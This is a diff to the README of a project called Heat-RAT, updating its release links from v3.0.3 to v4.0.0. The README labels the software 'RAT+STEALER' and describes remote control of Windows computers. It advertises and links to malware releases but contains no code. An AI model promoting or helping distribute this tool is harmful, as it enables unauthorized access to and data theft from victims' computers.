@@ -1,5 +1,5 @@
 <a id ="up"></a>
-[![logo](for_readme/LOGO.png)](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v3.0.3)
+[![logo](for_readme/LOGO.png)](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v4.0.0)
 <img src="https://img.shields.io/badge/C%2B%2B-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white">
 <img src="https://img.shields.io/badge/C-00599C?style=for-the-badge&logo=c&logoColor=white">
 <img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white">
@@ -12,7 +12,7 @@
 <img src="https://img.shields.io/badge/Microsoft-666666?style=for-the-badge&logo=microsoft&logoColor=white">
 <img src="https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white">
 
-[RAT+STEALER](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v3.0.3)
+[RAT+STEALER](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v4.0.0)
 ---
 🔭Program for remote control of Windows computers. Huge functionality. It has full and lite versions.
 
